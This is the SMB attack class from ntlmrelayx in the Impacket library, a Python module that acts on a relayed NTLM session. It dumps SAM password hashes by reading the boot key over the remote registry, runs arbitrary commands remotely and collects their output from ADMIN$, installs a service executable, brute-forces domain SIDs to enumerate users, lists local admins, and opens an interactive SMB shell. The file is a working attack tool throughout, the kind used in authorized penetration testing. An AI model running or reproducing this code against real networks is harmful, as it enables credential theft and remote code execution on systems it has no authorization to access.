# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2022 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SMB Attack Class
#   Defines a base class for all attacks + loads all available modules
#
# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
from impacket import smb3, smb
from impacket.examples import serviceinstall
from impacket.smbconnection import SMBConnection
from impacket.examples.smbclient import MiniImpacketShell
from impacket.dcerpc.v5.rpcrt import DCERPCException

PROTOCOL_ATTACK_CLASS = "SMBAttack"

class SMBAttack(ProtocolAttack):
    """
    This is the SMB default attack class.
    It will either dump the hashes from the remote target, or open an interactive
    shell if the -i option is specified.
    """
    PLUGIN_NAMES = ["SMB"]
    def __init__(self, config, SMBClient, username):
        ProtocolAttack.__init__(self, config, SMBClient, username)
        if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
            self.__SMBConnection = SMBConnection(existingConnection=SMBClient)
        else:
            self.__SMBConnection = SMBClient
        self.__answerTMP = bytearray()
        if self.config.interactive:
            #Launch locally listening interactive shell
            self.tcpshell = TcpShell()
        else:
            self.tcpshell = None
            if self.config.exeFile is not None:
                self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)

    def __answer(self, data):
        self.__answerTMP += data

    def run(self):
        # Here PUT YOUR CODE!
        if self.tcpshell is not None:
            LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)
            #Start listening and launch interactive shell
            self.tcpshell.listen()
            self.shell = MiniImpacketShell(self.__SMBConnection, self.tcpshell)
            self.shell.cmdloop()
            return
        if self.config.enumDomain:
            from impacket.examples.ntlmrelayx.utils.enum import EnumDomain
            try:
                LOG.info("Enumerate domain though SID Bruteforce...")
                enumDomain = EnumDomain(self.__SMBConnection)
                domainUsers = enumDomain.enumerateDomain()
                with open("domain_enum.csv","w+") as f:
                    for domainUser in domainUsers:
                        (sid, domain, username, usage) = domainUser
                        LOG.debug( "%s: %s\\%s (%s)" % (sid, domain, username,usage))
                        f.write("%s,%s\\%s,%s\n" % (sid, domain, username,usage))
                LOG.info("Bruteforce finish! Results written in domain_enum.csv")
            except Exception as e:
                LOG.error(str(e))
        if self.config.exeFile is not None:
            result = self.installService.install()
            if result is True:
                LOG.info("Service Installed.. CONNECT!")
                self.installService.uninstall()
        else:
            from impacket.examples.secretsdump import RemoteOperations, SAMHashes
            from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins
            samHashes = None
            try:
                # We have to add some flags just in case the original client did not
                # Why? needed for avoiding INVALID_PARAMETER
                if  self.__SMBConnection.getDialect() == smb.SMB_DIALECT:
                    flags1, flags2 = self.__SMBConnection.getSMBServer().get_flags()
                    flags2 |= smb.SMB.FLAGS2_LONG_NAMES
                    self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)

                remoteOps  = RemoteOperations(self.__SMBConnection, False)
                remoteOps.enableRegistry()
            except Exception as e:
                if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
                    if self.config.enumLocalAdmins:
                        LOG.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
                        enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
                        try:
                            localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
                            LOG.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
                            for name in localAdminNames:
                                LOG.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))
                        except DCERPCException:
                            LOG.info("SAMR access denied")
                        return
                # Something else went wrong. aborting
                LOG.error(str(e))
                return

            try:
                if self.config.command is not None:
                    remoteOps._RemoteOperations__executeRemote(self.config.command)
                    LOG.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
                    self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                    self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                    print(self.__answerTMP.decode(self.config.encoding, 'replace'))
                else:
                    bootKey = remoteOps.getBootKey()
                    remoteOps._RemoteOperations__serviceDeleted = True
                    samFileName = remoteOps.saveSAM()
                    samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
                    samHashes.dump()
                    samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
                    LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
            except Exception as e:
                LOG.error(str(e))
            finally:
                if samHashes is not None:
                    samHashes.finish()
                if remoteOps is not None:
                    remoteOps.finish()
